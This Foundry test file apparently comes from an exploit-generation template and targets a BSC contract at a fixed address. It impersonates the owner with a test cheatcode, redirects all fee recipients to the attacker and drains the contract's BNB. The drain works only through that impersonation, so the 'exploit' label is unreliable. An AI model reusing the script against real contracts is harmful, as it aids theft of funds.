pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MetaApesBSC {
    function getOwner() external view returns (address);
    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;
    function cSb(uint256 aP) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the template
        // The template already defines TARGET and attacker
        // We'll need to find the owner address first
        address owner = MetaApesBSC(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // Send some BNB to the contract first
        uint256 initialContractBalance = 10 ether;
        deal(TARGET, initialContractBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get the owner address
        address owner = MetaApesBSC(TARGET).getOwner();

        // Step 2: Impersonate the owner (who is authorized)
        vm.startPrank(owner);

        // Step 3: Set all recipient addresses to attacker's address
        MetaApesBSC(TARGET).setrecadd(
            attacker,  // mkwA
            attacker,  // krhF
            attacker,  // mdhS
            attacker,  // wthT
            attacker,  // extR
            attacker,  // bbaK
            attacker   // tfU
        );

        // Step 4: Drain 100% of BNB using cSb(100)
        MetaApesBSC(TARGET).cSb(100);

        vm.stopPrank();

        // Step 5: Verify attacker's balance increased
        uint256 attackerBalanceAfter = attacker.balance;
        assertGt(attackerBalanceAfter, 0, "Attacker should have received BNB");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

